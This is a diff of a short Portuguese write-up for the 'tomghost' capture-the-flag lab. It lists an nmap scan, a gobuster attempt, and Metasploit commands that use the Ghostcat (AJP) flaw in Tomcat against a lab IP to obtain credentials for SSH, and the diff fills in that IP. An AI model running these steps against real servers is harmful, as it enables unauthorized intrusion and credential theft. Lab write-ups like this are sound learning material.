@@ -1,7 +1,7 @@
 **Primeiro:**
-nmap -A -T4 <ip> para encontrar as portas
+- nmap -A -T4 10.65.151.48 para encontrar as portas
 
-rodamos o gobuster mas não deu muito resultado
+Rodamos o gobuster mas não deu muito resultado.
 
 Aplicamos o metaxploit para conseguir o usuario e a senha que nos ajudou a fazer o ssh
 Usamos metasploit pois a descrição do tomghost diz "Identify (...) to try **exploit** (...)"
@@ -12,7 +12,7 @@ Uma parte que nos ajudou foi encontrar o problema real do tomcat que foi registr
 Após iniciar o metasploit com msfconsole:
 - search jserv (coincidentemente, apareceu justamente o problema envolvendo o tomcat - ghostcat)
 - use 0 (índice do problema)
-- set RHOSTS <ip> (ip do alvo remoto)
+- set RHOSTS 10.65.151.48 (ip do alvo remoto)
 - set LHOST tun0 (nossa máquina que está atacando)
 - show options (nos mostrou justamente os itens envolvidos com a vulnerabilidade ghostcat)
 - run (efetivou o ataque)
